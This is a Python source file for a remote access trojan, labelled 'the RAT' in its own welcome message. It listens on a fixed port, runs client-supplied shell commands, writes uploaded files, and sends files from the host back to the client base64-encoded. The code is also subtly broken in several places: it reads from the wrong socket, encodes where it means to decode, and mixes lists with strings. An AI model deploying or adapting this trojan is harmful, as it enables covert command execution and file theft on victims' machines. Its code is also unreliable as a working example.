import os
import sys
import base64
import socket
import subprocess

# Constants
HEADERSIZE = 10
PORT = 64209

def retrieveMessage(s):
    newMessage = True
    fullMessage = ""
    while True:
        msg = s.recv(16)
        if newMessage:
            print(f"new message length = {msg[:HEADERSIZE]}")
            msgLength = int(msg[:HEADERSIZE])
            newMessage = False
        fullMessage += msg.decode("UTF-8")
        if len(fullMessage)-HEADERSIZE == msgLength:
            print("Full message received...")
            print(fullMessage[HEADERSIZE:])
            return fullMessage

### Execute ###
def Execute(command):
    subprocess.Popen(command, shell=True)

### Upload ###
def Upload(b64String, outputFile):
    
    OutputText = base64.b64encode(b64String)
    
    OutputFile = open(outputFile, 'wb')
    OutputFile.write(OutputText)

    
### Download ###
def Download(fileName):
    localFile = open(fileName, 'rb')
    OutputText = base64.b64encode(localFile.read())
    print(OutputText)
    localFile.close()
    return OutputText

# Main code
def main():
    # Start Socket stream
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind socket to current host along port
    s.bind((socket.gethostname(), PORT))
    # Start listening for a connection with a queue of 1
    s.listen(1)
    while True:
        # accept any incomming socket connection request
        clientsocket, address = s.accept()
        print(f"Found connection at {address}! Connection successful!")
        messageForClient = "Welcome to the RAT :)"
        messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
        clientsocket.send(bytes(messageForClient, "UTF-8"))
        
        msg = retrieveMessage(s)
        
        # Send message to client)
        
        # Parse the command from the client
        command = msg.split()[0]
        if "execute" in command:
            command = msg.split()[1:]
            Execute(command)
        elif "upload" in command:
            b64String = msg.split()[1]
            outputFile = msg.split()[2]
            Upload(b64String, outputFile)
        elif "download" in command:
            # Get a list of files in the current directory
            fileList = os.listdir()

            print(fileList)
            
            # Send the list of files back to the client
            messageForClient = f'{len(fileList):<{HEADERSIZE}}' + fileList
            clientsocket.send(bytes(messageForClient, "UTF-8"))

            # Receive the file name chosen by the client
            fileName = retrieveMessage(s)
            fileName = fileName.decode("utf-8")

            # Download the file and send it back to the client
            OutputText = Download(fileName)
            messageForClient = f'{len(OutputText):<{HEADERSIZE}}' + OutputText
            clientsocket.send(bytes(messageForClient, "UTF-8"))

if __name__ == '__main__':
    main()
